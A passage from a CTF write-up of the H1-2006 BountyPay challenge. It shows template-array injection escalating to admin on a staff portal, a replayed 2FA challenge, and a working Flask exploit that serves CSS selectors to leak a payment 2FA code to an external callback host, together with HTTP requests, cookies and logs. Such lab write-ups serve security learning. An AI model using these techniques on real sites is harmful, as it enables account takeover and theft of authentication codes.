upgradeToAdmin tab4\"\u003e\u003c/div\u003e\n                        \u003cdiv class=\"text-center\"\u003esandra\u003c/div\u003e\n                    \u003c/div\u003e\n                    \u003cdiv\u003e\n                        \u003cdiv style=\"margin-left:100px;min-height: 100px\"\u003e\n                            \u003ctextarea disabled class=\"form-control\"\u003eReplies are currently disabled\u003c/textarea\u003e\n                        \u003c/div\u003e\n                    \u003c/div\u003e\n                \u003c/div\u003e\n            \u003c/div\u003e\n        \u003c/div\u003e\n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"footer\" style=\"position: absolute;bottom:0;font-size:10px;height:30px;width:100%;background-color: #ececec;line-height:30px;text-align: center\"\u003e\n    \u0026copy;2020 BountyPay | \u003ca href=\"#\" data-toggle=\"modal\" data-target=\"#myModal\"\u003eReport This Page\u003c/a\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"modal fade\" id=\"myModal\" tabindex=\"-1\" role=\"dialog\" aria-labelledby=\"myModalLabel\"\u003e\n    \u003cdiv class=\"modal-dialog\" role=\"document\"\u003e\n        \u003cdiv class=\"modal-content\"\u003e\n            \u003cdiv class=\"modal-header\"\u003e\n                \u003cbutton type=\"button\" class=\"close\" data-dismiss=\"modal\" aria-label=\"Close\"\u003e\u003cspan aria-hidden=\"true\"\u003e\u0026times;\u003c/span\u003e\u003c/button\u003e\n                \u003ch4 class=\"modal-title\" id=\"myModalLabel\"\u003eReport Page\u003c/h4\u003e\n            \u003c/div\u003e\n            \u003cdiv class=\"modal-body\"\u003e\n                \u003cp\u003eIs there something wrong with this page? If so hit the \"Report Now\" button and the page will be sent over to our admins to checkout.\u003c/p\u003e\n\t\t\u003cp\u003ePages in the /admin directory will be ignored for security\u003c/p\u003e\n            \u003c/div\u003e\n            \u003cdiv class=\"modal-footer\"\u003e\n                \u003cbutton type=\"button\" class=\"btn btn-default\" data-dismiss=\"modal\"\u003eCancel\u003c/button\u003e\n                \u003cbutton type=\"button\" class=\"btn btn-primary sendReport\"\u003eReport Now\u003c/button\u003e\n            \u003c/div\u003e\n        \u003c/div\u003e\n    \u003c/div\u003e\n\u003c/div\u003e\n\n\n\n\u003cscript src=\"/js/jquery.min.js\"\u003e\u003c/script\u003e\n\u003cscript src=\"/js/bootstrap.min.js\"\u003e\u003c/script\u003e\n\u003cscript\u003e\n    var url = 'Lz90ZW1wbGF0ZVtdPXRpY2tldCZ0aWNrZXRfaWQ9MzU4MiZ0ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29u';\n\u003c/script\u003e\n\u003cscript src=\"/js/website.js\"\u003e\u003c/script\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n\u003c!DOCTYPE html\u003e\n\u003chtml lang=\"en\"\u003e\n\u003chead\u003e\n    \u003cmeta charset=\"utf-8\"\u003e\n    \u003cmeta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"\u003e\n    \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1\"\u003e\n    \u003ctitle\u003eStaff Login\u003c/title\u003e\n    \u003clink href=\"/css/bootstrap.min.css\" rel=\"stylesheet\"\u003e\n\u003c/head\u003e\n\u003cbody\u003e\n\n\u003cdiv class=\"container\"\u003e\n    \u003cdiv class=\"row\"\u003e\n        \u003cdiv class=\"col-sm-6 col-sm-offset-3\"\u003e\n            \u003ch1 style=\"text-align: center\"\u003eStaff Login\u003c/h1\u003e\n                        \u003cform method=\"post\" action=\"/?template=login\"\u003e\n                \u003cdiv class=\"panel panel-default\" style=\"margin-top:50px\"\u003e\n                    \u003cdiv class=\"panel-heading\"\u003eLogin\u003c/div\u003e\n                    \u003cdiv class=\"panel-body\"\u003e\n                        \u003cdiv style=\"margin-top:7px\"\u003e\u003clabel\u003eUsername:\u003c/label\u003e\u003c/div\u003e\n                        \u003cdiv\u003e\u003cinput name=\"username\" class=\"form-control\" value=\"sandra.allison\"\u003e\u003c/div\u003e\n                        \u003cdiv style=\"margin-top:7px\"\u003e\u003clabel\u003ePassword:\u003c/label\u003e\u003c/div\u003e\n                        \u003cdiv\u003e\u003cinput name=\"password\" type=\"password\" class=\"form-control\"\u003e\u003c/div\u003e\n                    \u003c/div\u003e\n                \u003c/div\u003e\n                \u003cinput type=\"submit\" class=\"btn btn-success pull-right\" value=\"Login\"\u003e\n            \u003c/form\u003e\n        \u003c/div\u003e\n    \u003c/div\u003e\n\u003c/div\u003e\n\u003cscript src=\"/js/jquery.min.js\"\u003e\u003c/script\u003e\n\u003cscript src=\"/js/bootstrap.min.js\"\u003e\u003c/script\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n```\n\nI have to say that while it was a fairly obvious thing to try after realising that you need to use `username` input from the login page - that's not something I would expect to see in a real-world application. I mean the general trick of breaking the app behavior by passing an Array to it is commonplace of course, for to actually have a backend that merges templates seems unlikely (at least no established framework would allow that) - there must have been some pretty custom code in the backend that lead to this.\n\nBack the the CTF - note that conveniently, we can also set the value for the `username` input via a GET parameter, which is the last piece for the attack chain.\n\nI then reported the following URL: `/?template[]=ticket\u0026ticket_id=3582\u0026template[]=login\u0026username=sandra.allison#tab4`\n```http\nGET /admin/report?url=Lz90ZW1wbGF0ZVtdPXRpY2tldCZ0aWNrZXRfaWQ9MzU4MiZ0ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uI3RhYjQ= HTTP/1.1\nHost: staff.bountypay.h1ctf.com\nX-Requested-With: XMLHttpRequest\nCookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR09NOVM5N0IvVGtnM2g3TmhWU0lENlV5WVJLRHlmRlZMRXZqTzFPaWQ0bDA0M2xZdXozYld3czZSUG9McFZ4TWlCSGtVR3lDU3FycUZGUjY0QXNHclN6dzhLTUpjUEJ6c3Z5VmIwNnRMSmFMTzZYR0FrTURqY0NsMDY0bVkrQzE3UT09\n```\nand ... nothing happened. Visiting that URL directly in the browser I saw that the request was still being made to `/admin/upgrade?username=undefined`. Of course, that makes sense. Javascript (unless loaded asynchronously) is evaluated immediately when it is encountered in the DOM, meaning that it only has access to DOM elements that precede it. I've put the templates in the wrong order, and `username` input simply didn't exist on the page yet when our code was executed.\n\nFinally, I reversed the order of templates: `/?template[]=login\u0026username=sandra.allison\u0026template[]=ticket\u0026ticket_id=3582#tab4`\n```http\nGET /admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyI3RhYjQ= HTTP/1.1\nHost: staff.bountypay.h1ctf.com\nX-Requested-With: XMLHttpRequest\nCookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR09NOVM5N0IvVGtnM2g3TmhWU0lENlV5WVJLRHlmRlZMRXZqTzFPaWQ0bDA0M2xZdXozYld3czZSUG9McFZ4TWlCSGtVR3lDU3FycUZGUjY0QXNHclN6dzhLTUpjUEJ6c3Z5VmIwNnRMSmFMTzZYR0FrTURqY0NsMDY0bVkrQzE3UT09\n```\n```http\nHTTP/1.1 200 OK\nContent-Type: application/json\nSet-Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR09NOVM5N0IvVGtnM2g3TmhWU0lENlV5WVJLRHlmRlZMRXZqTzFPaWQ0bDA0M2xZdXozYkJqRURhdXczckZGTWlCSGtVR3lDU3FycUZGUjY0QXNHOWlLbi9xY0pkUFIxdnFpV1B4V3JmY3JhT3ZqQ1ZFVlpnYzMzaFAxMllyUzE3UT09; expires=Mon, 06-Jul-2020 23:09:22 GMT; Max-Age=2592000; path=/\n\n[\"Report received\"]\n```\n\nAnd we were given a new session cookie! Logging in with that new cookie, we see that we indeed have extra privileges now. Namely, there is a new tab named `Admin`, showing plain text credentials for Mårten's customer account!\n{F863165}\n\nOne last thing that wasn't clear to me is what `/?template=admin` was for. I visited it, and it just returned `view admin` string... Must have just been added to divert attention.\n\n## Payment 2FA Bypass / CSS Exfiltration\n\nBack to customer portal at `app.bountypay.h1ctf.com` we login with Mårten's credentials. We use the same `challenge` and `challenge_answer` as before to bypass login 2FA:\n\n```http\nPOST / HTTP/1.1\nHost: app.bountypay.h1ctf.com\nContent-Type: application/x-www-form-urlencoded\n\nusername=marten.mickos\u0026password=h%26H5wy2Lggj*kKn4OD%26Ype\u0026challenge=5828c689761cce705a1c84d9b1a1ed5e\u0026challenge_answer=bD83Jk27dQ\n```\n```http\nHTTP/1.1 302 Found\nSet-Cookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9; expires=Mon, 06-Jul-2020 23:56:57 GMT; Max-Age=2592000\nLocation: /\n```\n\nRecall the original CTF tweet, and that we need to help Mårten approve May bug bounty payments. We thus fetch transactions for May 2020 and we indeed get a valid response this time:\n{F863225}\n\nWhen we click Pay, however, we're presented with another 2FA challenge:\n{F863226}\n\nOk. let's intercept the next request (when we click on \"Send Challenge\" button) and see what it looks like:\n\n```http\nPOST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1\nHost: app.bountypay.h1ctf.com\nContent-Type: application/x-www-form-urlencoded\nCookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9\n\napp_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css\n```\nAnd the relevant HTML snippet from the response:\n```html\n\u003ch1 class=\"text-center\"\u003eBountyPay\u003c/h1\u003e\n\u003ch3 class=\"text-center\"\u003e2FA Payment Challenge\u003c/h3\u003e\n\u003cform method=\"post\"\u003e\n\t\u003cinput type=\"hidden\" name=\"challenge_timeout\" value=\"1591490942\"\u003e\n\t\u003cinput type=\"hidden\" name=\"challenge\" value=\"2cf37bd3c17d4621658828b374579adb\"\u003e\n\t\u003cdiv class=\"panel panel-default\" style=\"margin-top:50px\"\u003e\n\t\t\u003cdiv class=\"panel-heading\"\u003ePayment Challenge Sent\u003c/div\u003e\n\t\t\u003cdiv class=\"panel-body text-center\"\u003e\n\t\t\t\u003cp\u003eWe have sent the payment challenge to your 2FA, you have 2 minutes to enter the code, please enter it below\u003c/p\u003e\n\t\t\t\u003cdiv\u003e\u003cinput name=\"challenge_answer\" class=\"form-control\" maxlength=\"7\"\u003e\u003c/div\u003e\n\t\t\u003c/div\u003e\n\t\u003c/div\u003e\n\t\u003cinput type=\"submit\" class=\"btn btn-success pull-right\" value=\"Send Answer\"\u003e\n\u003c/form\u003e\n```\nIssuing the request a few more times I confirmed that we're presented with a new `challenge`value every time, and our goal is to get the right `challenge_answer` for it, which shouldn't be longer than 7 characters (`maxlength=\"7\"`).The only unusual thing about this is that the POST request contains `app_style` parameter which references a stylesheet from `https://www.bountypay.h1ctf.com/css/uni_2fa_style.css`.\n\nThis seems a lot like we're going to need to exfiltrate `challenge_answer`with CSS, but let's confirm step by step.\n\nFirstly, I've made a request using Burp Collaborator payload to confirm we can fetch a stylesheet from an arbitrary external resource:\n\n```http\nPOST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1\nHost: app.bountypay.h1ctf.com\nContent-Type: application/x-www-form-urlencoded\nCookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9\n\napp_style=https://u1w9neu3o71nmwn6ryh9o7zbg2msah.burpcollaborator.net/css/uni_2fa_style.css\n```\nAnd I got a hit straight away:\n{F863231}\n\nA few things are worth noting when inspecting the request received by Collaborator:\n1. `User-Agent` tells us that request was made from Headless Chrome. \n2. [`Sec-Fetch-Dest: style`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Sec-Fetch-Dest) tells us that the resource would be embedded as a stylesheet (using `\u003clink ... rel=\"stylesheet\"\u003e`)\n\nGiven that we only have a single injection point, I assumed the task would be to exfiltrate `challenge_answer ` characters recursively. I was well aware of the relatively-recent technique for sequential exfiltration using `@import` directives, which you can read about in a brilliant blog post titled [Better Exfiltration via HTML Injection](https://medium.com/@d0nut/better-exfiltration-via-html-injection-31c72a2dae8b) by [@d0nutptr](https://twitter.com/d0nutptr). Worth mentioning that a similar technique was [first discovered](https://vwzq.net/slides/2019-s3_css_injection_attacks.pdf) half a year before by [Vila](https://twitter.com/cgvwzq). Note that this technique works in Chrome because Chrome processes `@import` directives asynchronously (executing the rest of CSS code while additional resources load). This, for instance, is not the case for Firefox that executes them sequentially, as was demonstrated by [Michał Bentkowski](https://twitter.com/securitymb) in another excellent blog post on this subject, titled [CSS data exfiltration in Firefox via a single injection point](https://research.securitum.com/css-data-exfiltration-in-firefox-via-single-injection-point/).\n\nSo the fact that page was loaded in Headless Chrome reaffirmed my intuition that we're after sequential exfiltration using `@import` directives. d0nutptr actually wrote a [sic](https://github.com/d0nutptr/sic) tool available on GitHub that could be used to execute such an attack, but I wanted to try this for myself so I wrote the necessary exploit in Python..... only to realise that it's not actually possible. As I have realized, Chrome only loads `@import` resources asynchronously when they appear within `\u003cstyle\u003e` elements in HTML. When they appear in the external stylesheets using `\u003clink\u003e` tag, however, Chrome stops CSS evaluation until the resource is loaded. It means that in our case sequential exfiltration isn't actually possible.\n\nFor a moment I even doubted whether this is about CSS exfiltration, so I even checked whether we could get XSS by injecting quotes into `app_style`to escape the attribute value... but it was secure.\n\nSo we're back to the CSS exfiltration. Ok, since the sequential technique won't work, let's just try to at least get the first character, for a start. To get that, all we need is a same-old trick of a selector matching a certain input name/value. First I tried adding this to my stylesheet:\n\n```css\ninput[name=challenge_answer]{\n    background-image: url(https://attacker.com/);\n}\n```\nand didn't get any hit. Ok, the input name must be different then - let's widen that by just matching on a single character:\n```css\ninput[name^=c]{\n    background-image: url(https://attacker.com/);\n}\n```\nThat gives a hit, so we're on the right track. But if the name is not `challenge_answer` but starts with `c`, what could that be? Re-reading the message again I realised that the name is likely to be `code`:  `We have sent the payment challenge to your 2FA, you have 2 minutes to enter the code, please enter it below`.\n\nWhen I tried an exact match on `code`, I didn't get any hit though:\n```css\ninput[name=code]{\n    background-image: url(https://attacker.com/);\n}\n```\nSo the name must be starting with the code then. At  this point I added a match on the first character of the value to see if I get anything back, and to my surprise I got 7 hits!\n```css\ninput[name^=code][value^=a]{\n    background-image: url(https://attacker.com/exfil/a);\n}\ninput[name^=code][value^=b]{\n    background-image: url(https://attacker.com/exfil/b);\n}\n...\n```\n(I've used all ASCII letters, both uppercase and lowercase, and digits).\n\nThis is when it struck me that there are, in fact, 7 separate inputs on the page, each containing a single character. This made perfect sense, as to exfiltrate such code we don't need any sequential imports - we just need many selectors.\n\nBut before we get there, we need to know exact names of inputs - because we need to know the exact order of characters. If we simply match on `input[name^=code]` we'd never know which character is at which place.\n\nSo I quickly made another few iterations on progressively matching the next character to determine the input names and they turned out to be `code_1`, `code_2`, ..., `code_7`. From there it was all really trivial.\n\nLet's see what my final code looks like, and then we can break it down piece by piece:\n\nI'm using Flask here. Since it needs to be available on public internet and with a valid HTTPS certificate, I'm not focusing on how this could be ran / deployed. Rather, this shows Flask routes with all the relevant logic of the exploit.\n```python\nimport logging\nimport string\nfrom collections import defaultdict\nfrom typing import List\nfrom uuid import uuid4\n\nfrom flask import url_for, Response, current_app, request\n\nfrom . import blueprint\n\nlogger = logging.getLogger(__name__)\n\nNUM_CHARS = 7\n\nALLOWED_CHARS = string.digits + string.ascii_letters + string.punctuation\n\n# Store exfiltrated results in a dict where keys are sessions and values are 7-element lists\ncode_chars = defaultdict(lambda: [None] * NUM_CHARS)\n\noriginal_css = \"\"\"\n/**\nTemplate for the UNI 2FA App\n */\n\nbody {\n    background-color: #FFFFFF;\n}\n\ndiv.branding {\n    height:80px;\n    width:80px;\n    margin:20px auto 40px auto;\n    background-image:url(\"https://www.bountypay.h1ctf.com/images/bountypay.png\");\n    background-position:center center;\n    background-repeat: no-repeat;\n    background-size: cover;\n}\n\"\"\"\n\n\n@blueprint.route('/uni_2fa_style.css')\ndef uni_2fa_style_css():\n    session = request.args.get('session', uuid4().hex[:5])\n\n    def selector(pos, char):\n        name = escape_css_selector(f'code_{pos + 1}')\n        value = escape_css_selector(char)\n        callback = url_for(\".h1_2006_callback\", session=session, pos=pos, char=char, _external=True, _scheme='https')\n        return f'input[name=\"{name}\"][value=\"{value}\"]{{background-image: url({callback});}}'\n\n    selectors = [selector(pos, char) for pos in range(NUM_CHARS) for char in ALLOWED_CHARS]\n\n    css = '\\n'.join(selectors + [original_css])\n\n    return Response(css, mimetype='text/css')\n\n\n@blueprint.route('/h1-2006-callback/\u003csession\u003e/\u003cint:pos\u003e/\u003cchar\u003e')\ndef h1_2006_callback(session: str, pos: int, char: str):\n    global code_chars\n\n    chars: List = code_chars[session]\n    chars[pos] = char\n\n    if None not in chars:\n        code = ''.join(chars)\n        logger.info(f\"[session {session}] Exfiltrated code: {code}\")\n\n    return '', 204  # 204 No Content, i.e. just empty response\n\n\ndef escape_css_selector(selector: str) -\u003e str:\n    return selector \\\n        .replace(\"\\\\\", \"\\\\\\\\\") \\\n        .replace(\"!\", \"\\\\!\") \\\n        .replace(\"\\\"\", \"\\\\\\\"\") \\\n        .replace(\"#\", \"\\\\#\") \\\n        .replace(\"$\", \"\\\\$\") \\\n        .replace(\"%\", \"\\\\%\") \\\n        .replace(\"\u0026\", \"\\\\\u0026\") \\\n        .replace(\"'\", \"\\\\'\") \\\n        .replace(\"(\", \"\\\\(\") \\\n        .replace(\")\", \"\\\\)\") \\\n        .replace(\"*\", \"\\\\*\") \\\n        .replace(\"+\", \"\\\\+\") \\\n        .replace(\",\", \"\\\\,\") \\\n        .replace(\"-\", \"\\\\-\") \\\n        .replace(\".\", \"\\\\.\") \\\n        .replace(\"/\", \"\\\\/\") \\\n        .replace(\":\", \"\\\\:\") \\\n        .replace(\";\", \"\\\\;\") \\\n        .replace(\"\u003c\", \"\\\\\u003c\") \\\n        .replace(\"=\", \"\\\\=\") \\\n        .replace(\"\u003e\", \"\\\\\u003e\") \\\n        .replace(\"?\", \"\\\\?\") \\\n        .replace(\"@\", \"\\\\@\") \\\n        .replace(\"[\", \"\\\\[\") \\\n        .replace(\"]\", \"\\\\]\") \\\n        .replace(\"^\", \"\\\\^\") \\\n        .replace(\"`\", \"\\\\`\") \\\n        .replace(\"{\", \"\\\\{\") \\\n        .replace(\"|\", \"\\\\|\") \\\n        .replace(\"}\", \"\\\\}\") \\\n        .replace(\"~\", \"\\\\~\")\n\n```\nLet's break it down.\n\nFirstly, we build a stylesheet by adding a selector for every code input field, and for every possible character. You would notice that I also use a `session` within my callbacks - this is to ensure that responses from overlapping attempts won't ever get mixed up.\n```python\n@blueprint.route('/uni_2fa_style.css')\ndef uni_2fa_style_css():\n    session = request.args.get('session', uuid4().hex[:5])\n\n    def selector(pos, char):\n        name = escape_css_selector(f'code_{pos + 1}')\n        value = escape_css_selector(char)\n        callback = url_for(\".h1_2006_callback\", session=session, pos=pos, char=char, _external=True, _scheme='https')\n        return f'input[name=\"{name}\"][value=\"{value}\"]{{background-image: url({callback});}}'\n\n    selectors = [selector(pos, char) for pos in range(NUM_CHARS) for char in ALLOWED_CHARS]\n\n    css = '\\n'.join(selectors + [original_css])\n\n    return Response(css, mimetype='text/css')\n```\nYou can see the resulting CSS generated by this code e.g. [here](https://py.whitehat-hacker.com/poc/ctf/uni_2fa_style.css):\n```css\ninput[name=\"code_1\"][value=\"0\"]{background-image: url(https://py.whitehat-hacker.com/poc/ctf/h1-2006-callback/09278/0/0);}\ninput[name=\"code_1\"][value=\"1\"]{background-image: url(https://py.whitehat-hacker.com/poc/ctf/h1-2006-callback/09278/0/1);}\ninput[name=\"code_1\"][value=\"2\"]{background-image: url(https://py.whitehat-hacker.com/poc/ctf/h1-2006-callback/09278/0/2);}\ninput[name=\"code_1\"][value=\"3\"]{background-image: url(https://py.whitehat-hacker.com/poc/ctf/h1-2006-callback/09278/0/3);}\ninput[name=\"code_1\"][value=\"4\"]{background-image: url(https://py.whitehat-hacker.com/poc/ctf/h1-2006-callback/09278/0/4);}\n...\n```\n\nWhat's worth noting is that certain characters have to be escaped within CSS selectors - this is what my `escape_css_selector` function is for. To build a proper escaping function that would cover all cases is actually no easy task. If you're into that sort of stuff, I highly recommend [CSS character escape sequences](https://mathiasbynens.be/notes/css-escapes) blog post by [Mathias Bynens](https://twitter.com/mathias), who has also made an [online tool] (https://mothereff.in/css-escapes) to do such escaping, with [source code [javascript]](https://github.com/mathiasbynens/mothereff.in/tree/master/css-escapes) available on GitHub. In our case we don't need to handle all these edge cases though, and in fact I've bluntly copy-pasted the escaping part from d0nutptr's [sic](https://github.com/d0nutptr/sic/blob/master/src/main.rs#L298-L330) tool.\n\nWe're using a dict of lists (keyed by session) to store the characters we receive at the right places in the list:\n```python\n# Store exfiltrated results in a dict where keys are sessions and values are 7-element lists\ncode_chars = defaultdict(lambda: [None] * NUM_CHARS)\n```\n\nAnd lastly, the route for the callback - we just keep collecting the characters, and when we have all 7 for this session, we join them up and log the code:\n\n```python\n@blueprint.route('/h1-2006-callback/\u003csession\u003e/\u003cint:pos\u003e/\u003cchar\u003e')\ndef h1_2006_callback(session: str, pos: int, char: str):\n    global code_chars\n\n    chars: List = code_chars[session]\n    chars[pos] = char\n\n    if None not in chars:\n        code = ''.join(chars)\n        logger.info(f\"[session {session}] Exfiltrated code: {code}\")\n\n    return '', 204  # 204 No Content, i.e. just empty response\n```\n\nA sample output of running such code (and passing our stylesheet to the 2FA challenge) is like this:\n```\n[Thread-10 |pid:17455] INFO: 172.17.0.2 - - [09/Jun/2020 00:33:34] \"GET /poc/ctf/uni_2fa_style.css HTTP/1.0\" 200 -\n[Thread-11 |pid:17455]INFO: 172.17.0.2 - - [09/Jun/2020 00:33:34] \"GET /poc/ctf/h1-2006-callback/0cc2d/0/b HTTP/1.0\" 204 -\n[Thread-12 |pid:17455] INFO: 172.17.0.2 - - [09/Jun/2020 00:33:34] \"GET /poc/ctf/h1-2006-callback/0cc2d/1/N HTTP/1.0\" 204 -\n[Thread-13 |pid:17455] INFO: 172.17.0.2 - - [09/Jun/2020 00:33:34] \"GET /poc/ctf/h1-2006-callback/0cc2d/2/f HTTP/1.0\" 204 -\n[Thread-14 |pid:17455] INFO: 172.17.0.2 - - [09/Jun/2020 00:33:34] \"GET /poc/ctf/h1-2006-callback/0cc2d/3/Q HTTP/1.0\" 204 -\n[Thread-15 |pid:17455] INFO: 172.17.0.2 - - [09/Jun/2020 00:33:34] \"GET /poc/ctf/h1-2006-callback/0cc2d/4/h HTTP/1.0\" 204 -\n[Thread-16 |pid:17455] INFO: 172.17.0.2 - - [09/Jun/2020 00:33:34] \"GET /poc/ctf/h1-2006-callback/0cc2d/5/D HTTP/1.0\" 204 -\n[Thread-17 |pid:17455] INFO: [session 0cc2d] Exfiltrated code: bNfQhDT\n[Thread-17 |pid:17455] INFO: 172.17.0.2 - - [09/Jun/2020 00:33:34] \"GET /poc/ctf/h1-2006-callback/0cc2d/6/T HTTP/1.0\" 204 -\n```\n\nOnce we obtain the code, we simply submit it as a response for 2FA challenge using the corresponding input on the page, and we're finally presented with the flag!\n{F863338}\n\nIf you've read this far, thank you very much for bearing with me!\n\n--------------------------------------------\nReferences\n\nTools\n* [Amass](https://github.com/OWASP/Amass)\n* [Massdns](https://github.com/blechschmidt/massdns) \n  * [commonspeak2](https://github.com/assetnote/commonspeak2-wordlists/blob/master/subdomains/subdomains.txt)\n  * [dnsgen](https://github.com/ProjectAnte/dnsgen)\n* [ffuf](https://github.com/ffuf/ffuf)\n* [gitdumper.sh](https://github.com/internetwache/GitTools/blob/master/Dumper/gitdumper.sh)\n* [dex2jar](https://github.com/pxb1988/dex2jar)\n* [JD-GUI](http://java-decompiler.github.io/)\n* [sic](https://github.com/d0nutptr/sic) \n* [CSS escapes](https://github.com/mathiasbynens/mothereff.in/tree/master/css-escapes) with [online tool] (https://mothereff.in/css-escapes)\n\nTechniques / Blog posts\n* [Subdomain Enumeration: 2019 Workflow](https://0xpatrik.com/subdomain-enumeration-2019/) by [Patrik Hudak](https://twitter.com/0xpatrik) \n* [Better Exfiltration via HTML Injection](https://medium.com/@d0nut/better-exfiltration-via-html-injection-31c72a2dae8b) by [@d0nutptr](https://twitter.com/d0nutptr)\n* [CSS Injection Attacks](https://vwzq.net/slides/2019-s3_css_injection_attacks.pdf) by  [Pepe Vila](https://twitter.com/cgvwzq)\n* [CSS data exfiltration in Firefox via a single injection point](https://research.securitum.com/css-data-exfiltration-in-firefox-via-single-injection-point/) by [Michał Bentkowski](https://twitter.com/securitymb)\n* [CSS character escape sequences](https://mathiasbynens.be/notes/css-escapes) by [Mathias Bynens](https://twitter.com/mathias)\n\n## Impact\n\n-","vulnerability_information_html":"\u003ch1 id=\"h1-2006-ctf-writeup\"\u003eH1-2006 CTF Writeup\u003c/h1\u003e\n\n\u003cp\u003eI am fairly new to CTFs - this is just my second CTF after \u003ca href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2FHacker0x01%2Fstatus%2F1217561343986782209\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eH1-415 CTF\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, at which I didn\u0026#39;t get far at all. I think the most valuable thing I can do for anyone who comes across this writeup, is to describe exactly what I was thinking at each step along the way, including all my failures and dead ends. I personally always find those parts the most valuable in any bug report or writeup that I read.\u003c/p\u003e\n\n\u003chr\u003e\n\n\u003ch1 id=\"tl-dr\"\u003eTL;DR\u003c/h1\u003e\n\n\u003cp\u003e\u003cstrong\u003eFor those impatient, here is a condensed walk-through of the CTF. If you\u0026#39;re here after the long writeup, you can safely skip this part.\u003c/strong\u003e.\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eSubdomain enumeration yields several subdomains: \u003ccode\u003eapp.bountypay.h1ctf.com\u003c/code\u003e (customer portal with username/password login), \u003ccode\u003estaff.bountypay.h1ctf.com\u003c/code\u003e (staff portal with username/password login), \u003ccode\u003eapi.bountypay.h1ctf.com\u003c/code\u003e, \u003ccode\u003esoftware.bountypay.h1ctf.com\u003c/code\u003e(denies access from public IPs).\u003c/li\u003e\n\u003cli\u003eContent discovery on \u003ccode\u003eapp.bountypay.h1ctf.com\u003c/code\u003e reveals \u003ccode\u003e/.git/config\u003c/code\u003e which references GitHub repo at \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fbounty-pay-code%2Frequest-logger.git\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/bounty-pay-code/request-logger.git\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003cli\u003eSource code in the repo exposes the presence of \u003ca href=\"/redirect?url=http%3A%2F%2Fapp.bountypay.h1ctf.com%2Fbp_web_trace.log\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e\u003ccode\u003e/bp_web_trace.log\u003c/code\u003e\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e file, which gives us three things:\n\n\u003cul\u003e\n\u003cli\u003e Log file gives us \u003ccode\u003eusername\u003c/code\u003e and \u003ccode\u003epassword\u003c/code\u003e for authentication on the customer portal, \u003ccode\u003eapp.bountypay.h1ctf.com\u003c/code\u003e. Using these credentials we\u0026#39;re presented with 2FA challenge. On every access It gives us a random \u003ccode\u003echallenge\u003c/code\u003e (md5 hash) that we need to guess a valid \u003ccode\u003echallenge_answer\u003c/code\u003e for.\u003c/li\u003e\n\u003cli\u003eLog file also gives us a \u003ccode\u003echallenge_answer\u003c/code\u003e (for the past login attempt), but no \u003ccode\u003echallenge\u003c/code\u003e itself. The solution is that \u003ccode\u003echallenge\u003c/code\u003e is simply an md5 hash of the \u003ccode\u003echallenge_answer\u003c/code\u003e, and there is nothing preventing the re-use of the old challenge, so we compute md5 hash of that \u003ccode\u003echallenge_answer\u003c/code\u003e and use this pair to login.\u003c/li\u003e\n\u003cli\u003eLast thing the log file gives us is the following endpoint: \u003ccode\u003eGET /statements?month=04\u0026amp;year=2020\u003c/code\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eAuthentication cookie is base64-encoded JSON such as \u003ccode\u003e{\u0026quot;account_id\u0026quot;:\u0026quot;F8gHiqSdpK\u0026quot;,\u0026quot;hash\u0026quot;:\u0026quot;de235bffd23df6995ad4e0930baac1a2\u0026quot;}\u003c/code\u003e, where \u003ccode\u003ehash\u003c/code\u003e is the actual session, while \u003ccode\u003eaccount_id\u003c/code\u003e can be freely tampered with.\u003c/li\u003e\n\u003cli\u003eThe \u003ccode\u003e/statements\u003c/code\u003e endpoint above reveals that it makes a server-side request to \u003ccode\u003ehttps://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/statements?month=04\u0026amp;year=2020\u003c/code\u003e.  When accessed directly, the API endpoint responds with 401 \u003ccode\u003e[\u0026quot;Missing or invalid Token\u0026quot;]\u003c/code\u003e. Observe the same account id value, 